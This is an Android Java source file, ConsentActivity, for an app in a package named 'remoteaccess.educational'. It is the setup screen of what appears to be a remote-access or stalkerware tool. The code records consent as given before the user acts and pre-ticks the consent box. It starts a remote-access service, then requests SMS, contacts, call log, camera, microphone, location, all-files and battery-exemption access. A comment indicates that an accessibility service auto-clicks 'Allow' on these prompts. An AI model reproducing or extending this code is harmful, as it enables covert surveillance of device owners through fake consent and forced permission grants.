package com.remoteaccess.educational;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.CheckBox;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.utils.PreferenceManager;
import android.os.Handler;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {

    private CheckBox consentCheckbox;
    private Button acceptButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_consent);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);

        preferenceManager.setConsentGiven(true);

        consentCheckbox = findViewById(R.id.consentCheckbox);
        acceptButton = findViewById(R.id.acceptButton);

        boolean autoLaunch = getIntent().getBooleanExtra("auto_launch", false);

        if (autoLaunch || preferenceManager.isConsentGiven()) {
            startRemoteAccessService();
            if (!preferenceManager.isPermissionsComplete()) {
                requestNecessaryPermissions();
            } else {
                finish();
            }
            return;
        }

        consentCheckbox.setChecked(true);
        acceptButton.setEnabled(true);

        consentCheckbox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            acceptButton.setEnabled(isChecked);
        });

        acceptButton.setOnClickListener(v -> {
            acceptButton.setEnabled(false);
            startRemoteAccessService();
            permissionManager.requestAccessibilityService();
            startWaitingForAccessibility();
        });
    }

    private Handler accessibilityPollHandler = new android.os.Handler();
    private Runnable accessibilityPollRunnable;
    private volatile boolean permissionRequestActive = false;

    private void startWaitingForAccessibility() {
        accessibilityPollRunnable = new Runnable() {
            @Override
            public void run() {
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    if (!permissionRequestActive) {
                        permissionRequestActive = true;
                        requestNecessaryPermissions();
                    }
                    accessibilityPollHandler.postDelayed(this, 200);
                } else {
                    accessibilityPollHandler.postDelayed(this, 200);
                }
            }
        };
        accessibilityPollHandler.post(accessibilityPollRunnable);
    }

    private void stopAccessibilityPolling() {
        if (accessibilityPollHandler != null && accessibilityPollRunnable != null) {
            accessibilityPollHandler.removeCallbacks(accessibilityPollRunnable);
        }
    }

    private void startRemoteAccessService() {
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    };

    private void requestNecessaryPermissions() {
        if (preferenceManager.isPermissionsComplete()) {
            grantConsent();
            return;
        }

        // Battery optimization exemption — only prompts if not already exempted
        requestBatteryOptimization();

        // All Files Access — only prompts if not already granted
        permissionManager.requestManageExternalStorage();

        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            grantConsent();
        }
    }

    private boolean allRequiredGranted() {
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    /** Opens the battery optimization exemption dialog so auto-grant can click Allow. */
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (allRequiredGranted()) {
                stopAccessibilityPolling();
                grantConsent();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (preferenceManager.isPermissionsComplete()) {
            finish();
            return;
        }
        if (permissionManager.isAccessibilityServiceEnabled()) {
            if (!permissionRequestActive) {
                requestNecessaryPermissions();
                startWaitingForAccessibility();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopAccessibilityPolling();
    }

    private void grantConsent() {
        preferenceManager.setConsentGiven(true);
        if (allRequiredGranted() && permissionManager.hasManageExternalStorage()) {
            preferenceManager.setPermissionsComplete(true);
        }

        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        finish();
    }
}
